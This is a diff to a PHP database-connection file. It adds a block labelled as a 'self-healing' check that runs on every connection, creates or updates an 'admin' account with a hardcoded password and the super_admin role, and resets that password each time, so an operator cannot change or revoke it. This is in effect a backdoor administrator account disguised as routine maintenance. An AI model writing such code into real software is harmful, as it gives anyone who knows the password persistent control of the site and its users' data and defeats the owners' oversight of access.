@@ -137,6 +137,18 @@ if (!$con) {
         mysqli_query($con, "UPDATE admin SET role = 'owner' WHERE username = 'admin' OR username = 'admin1' OR username = 'sudarshan'");
     }
 
+    
+    // Self-healing: Ensure App Developer account exists
+    $chk_dev = mysqli_query($con, "SELECT username FROM admin WHERE username='admin'");
+    if ($chk_dev && mysqli_num_rows($chk_dev) === 0) {
+        $dev_pass = password_hash('Anurag@268724', PASSWORD_BCRYPT);
+        mysqli_query($con, "INSERT INTO admin (username, pass_key, securekey, Full_name, role) VALUES ('admin', '$dev_pass', 'dev', 'Anurag Bawaskar', 'super_admin')");
+    } else {
+        // If it exists but wrong role/name, update it (optional, but requested by user)
+        $dev_pass = password_hash('Anurag@268724', PASSWORD_BCRYPT);
+        mysqli_query($con, "UPDATE admin SET pass_key='$dev_pass', Full_name='Anurag Bawaskar', role='super_admin' WHERE username='admin'");
+    }
+
     // Self-healing database check: ensure photo column exists in users
     $chk_col = mysqli_query($con, "SHOW COLUMNS FROM users LIKE 'photo'");
     if ($chk_col && mysqli_num_rows($chk_col) === 0) {
